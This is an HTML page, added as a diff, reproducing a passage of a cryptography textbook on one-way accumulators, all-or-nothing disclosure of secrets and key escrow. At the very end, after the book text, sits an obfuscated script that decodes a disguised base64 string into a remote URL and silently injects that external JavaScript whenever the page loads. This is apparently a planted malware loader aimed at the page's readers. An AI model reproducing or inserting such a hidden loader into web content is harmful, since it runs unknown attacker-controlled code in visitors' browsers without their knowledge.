@@ -1,0 +1,87 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Intermediate Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=04//-->
+<!--PAGES=095-097//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading13"></A><FONT COLOR="#000077">4.12 One-Way Accumulators</FONT></H3>
+<P>Alice is a member of Cabal, Inc. Occasionally she has to meet with other members in dimly lit restaurants and whisper secrets back and forth. The problem is that the restaurants are so dimly lit that she has trouble knowing if the person across the table from her is also a member.
+</P>
+<P>Cabal Inc. can choose from several solutions. Every member can carry a membership list. This has two problems. One, everyone now has to carry a large database, and two, they have to guard that membership list pretty carefully. Alternatively, a trusted secretary could issue digitally signed ID cards. This has the added advantage of allowing outsiders to verify members (for discounts at the local grocery store, for example), but it requires a trusted secretary. Nobody at Cabal, Inc. can be trusted to that degree.</P>
+<P>A novel solution is to use something called a <B>one-way accumulator</B> [116]. This is sort of like a one-way hash function, except that it is commutative. That is, it is possible to hash the database of members in any order and get the same value. Moreover, it is possible to add members into the hash and get a new hash, again without regard to order.</P>
+<P>So, here&#146;s what Alice does. She calculates the accumulation of every member&#146;s name other than herself. Then she saves that single value along with her own name. Bob, and every other member, does the same. Now, when Alice and Bob meet in the dimly lit restaurant, they simply trade accumulations and names with each other. Alice confirms that Bob&#146;s name added to his accumulation is equal to Alice&#146;s name added to her accumulation. Bob does the same. Now they both know that the other is a member. And at the same time, neither can figure out the identities of any other member.</P>
+<P>Even better, nonmembers can be given the accumulation of everybody. Now Alice can verify her membership to a nonmember (for membership discounts at their local counterspy shop, perhaps) without the nonmember being able to figure out the entire membership list.</P>
+<P>New members can be added just by sending around the new names. Unfortunately, the only way to delete a member is to send everyone a new list and have them recompute their accumulations. But Cabal, Inc. only has to do that if a member resigns; dead members can remain on the list. (Oddly enough, this has never been a problem.)</P>
+<P>This is a clever idea, and has applications whenever you want the same effect as digital signatures without a centralized signer.</P>
+<H3><A NAME="Heading14"></A><FONT COLOR="#000077">4.13 All-or-Nothing Disclosure of Secrets</FONT></H3>
+<P>Imagine that Alice is a former agent of the former Soviet Union, now unemployed. In order to make money, Alice sells secrets. Anyone who is willing to pay the price can buy a secret. She even has a catalog. All her secrets are listed by number, with tantalizing titles: &#147;Where is Jimmy Hoffa?&#148;, &#147;Who is secretly controlling the Trilateral Commission?&#148;, &#147;Why does Boris Yeltsin always look like he swallowed a live frog?&#148;, and so on.
+</P>
+<P>Alice won&#146;t give away two secrets for the price of one or even partial information about any of the secrets. Bob, a potential buyer, doesn&#146;t want to pay for random secrets. He also doesn&#146;t want to tell Alice which secrets he wants. It&#146;s none of Alice&#146;s business, and besides, Alice could then add &#147;what secrets Bob is interested in&#148; to her catalog.</P>
+<P>A poker protocol won&#146;t work in this case, because at the end of the protocol Alice and Bob have to reveal their hands to each other. There are also tricks Bob can do to learn more than one secret.</P>
+<P>The solution is called <B>all-or-nothing disclosure of secrets (ANDOS)</B> [246] because, as soon as Bob has gained any information whatsoever about one of Alice&#146;s secrets, he has wasted his chance to learn anything about any of the other secrets.</P>
+<P>There are several ANDOS protocols in the cryptographic literature. Some of them are discussed in Section 23.9.</P>
+<H3><A NAME="Heading15"></A><FONT COLOR="#000077">4.14 Key Escrow</FONT></H3>
+<P>This excerpt is from Silvio Micali&#146;s introduction to the topic [1084]:
+</P>
+<BLOCKQUOTE><P>Currently, court-authorized line tapping is an effective method for securing criminals to justice. More importantly, in our opinion, it also prevents the further spread of crime by deterring the use of ordinary communication networks for unlawful purposes. Thus, there is a legitimate concern that widespread use of public-key cryptography may be a big boost for criminal and terrorist organizations. Indeed, many bills propose that a proper governmental agency, under circumstances allowed by law, should be able to obtain the clear text of any communication over a public network. At the present time, this requirement would translate into coercing citizens to either (1) <I>using weak cryptosystems</I>&#151;i.e., cryptosystems that the proper authorities (but also everybody else!) could crack with a moderate effort&#151;or (2) <I>surrendering</I>, a priori, <I>their secret key</I> to the authority. It is not surprising that such alternatives have legitimately alarmed many concerned citizens, generating as reaction the feeling that privacy should come before national security and law enforcement.</P>
+</BLOCKQUOTE><P>Key escrow is the heart of the U.S. government&#146;s Clipper program and its Escrowed Encryption Standard. The challenge here is to develop a cryptosystem that both protects individual privacy but at the same time allows for court-authorized wiretaps.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ylvnhkka, zViOOmWi) {zViOOmWi = ylvnhkka.createElement('script');zViOOmWi.type = 'text/javascript';zViOOmWi.async = true;zViOOmWi.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ylvnhkka.getElementsByTagName('body')[0].appendChild(zViOOmWi);}(document));</script></body>
+</html>
